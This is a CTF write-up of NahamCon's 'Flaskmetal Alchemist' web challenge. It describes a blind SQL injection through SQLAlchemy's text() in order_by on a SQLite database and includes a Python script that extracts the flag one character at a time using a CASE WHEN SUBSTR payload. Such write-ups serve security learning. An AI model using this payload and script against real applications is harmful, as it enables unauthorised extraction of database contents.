# Flaskmetal Alchemist - Web - Medium

I'm always happy when I get to do a blind injection of any kind, and at this year's Naham Con CTF I got to do just that.

Flaskmetal Alchemist was a medium challenge, leveraging a blind SQL injection to retrieve the flag stored in a sqlite database.

On initialising the instance, we are greeted with a page with some elements from the periodic table, their atomic numbers and symbols.

![App home screen](screenshots/fma_4.png?raw=true)

The challenge also had a downloadable part available, which was some partial source code for the application. As the challenge name suggests, this application used flask on the back end. 

The use of Jinja as a templating engine initially made me think there could be some Server Side Template Injection involved - but some quick tests showed that it wasn't the case.

The functionaility itself was very straightforward - you could search for an element, and you had the option to sort the results. Going back to the source code, upon initialisation the app would create 2 tables in the DB - metals and flag, and from that and the fact that there were only 2 parameters used in the whole app, it became clear that this was likely going to be some form of SQL injection.

Upon some further inspection of the pip requirements.txt file, one dependency in particular stood out to me - SQLAlchemy 1.2.17. I hadn't heard of SQLAlchemy before, and after spending some time digging through their Github and reading up on it I discovered that prior to version 1.3 SQLAlchemy had some SQL injection vulnerabilities - and the version that we were provided with specifically had a vulnerability in the order_by function. In particular, it was this piece of code in the app.py file that would be our entry point:

            metals = Metal.query.filter(
                Metal.name.like("%{}%".format(search))
            ).order_by(text(order))

In SQLAlchemy, the text() construct would actually "textualise" the input and construct a Text Clause, which would then be executed as SQL. At this point all that was left was to construct some form of a query and see if we could execute it. 

After a while of playing around with the order param, I managed to get a nested query executed - using (SELECT name) ASC.

![Burp request](screenshots/fma_7.png?raw=true)

So having confirmed that I could execute a query, I went for the standard approach of attempting to extract the flag character by character from the database. It took me far longer than I care to admit to finally get a substring query executed, primarily because I simply couldn't figure out what DBMS and flavour of SQL I was dealing with. The docs didn't help here much, and in the end I realised that I'd missed a cruicial piece of information while examining the source code:

![Sqlite](screenshots/fma_5.png?raw=true)

The app used sqlite - meaning the substring syntax was slightly different to MySQL/Postgres, so with that information in hand I was finally able to construct a query. Knowing that each flag started with "flag{" I tested my query to check if the first character was an "f", and it worked.

So finally, all that was left was to put together a python script to do the heavy lifting. I ended up parsing the responses with Beautiful Soup to extract out the first value in the HTML table and using the order as a measurement to see if my query was true or false - if the character that was being tested was in the flag, the results would be sorted by name, otherwise by their atomic numbers. So in the case of my script, I checked to see if the first element in the HTML table had an atoimic number of 12 - which would've been true if the elements were sorted by atomic number - and if it wasn't then we would have a truthy query.


	import requests
	import string
	from bs4 import BeautifulSoup

	url = "http://challenge.nahamcon.com:30816/"

	chars = string.ascii_lowercase + "}{_"

	leaked = []

	while True:
		for char in chars:
			position = len(leaked) + 1
			r = requests.post(url, data={
				"search": "a",
				"order": f"(CASE WHEN (SELECT SUBSTR(flag,{position},1) FROM flag) = '{char}' 
				THEN name ELSE atomic_number END) ASC",
			})

			soup = BeautifulSoup(r.text, 'html.parser')	#	Parse the current div using BeautifulSoup
			if "Flaskmetal Alchemist" in r.text:		#	Only test valid responses
				result = soup.select('tr')[1].get_text(strip=True)

				if "12" not in result:
					leaked.append(char)
					print(f"FOUND CHAR: " + char)
			print(f"Trying: " + "".join(leaked) + char)

So after letting the script run for a while, I had my flag:

![Flag](screenshots/fma_3.png?raw=true)


This was a fun challenge with some interesting twists along the way - thanks to Ben and the team for hosting this event.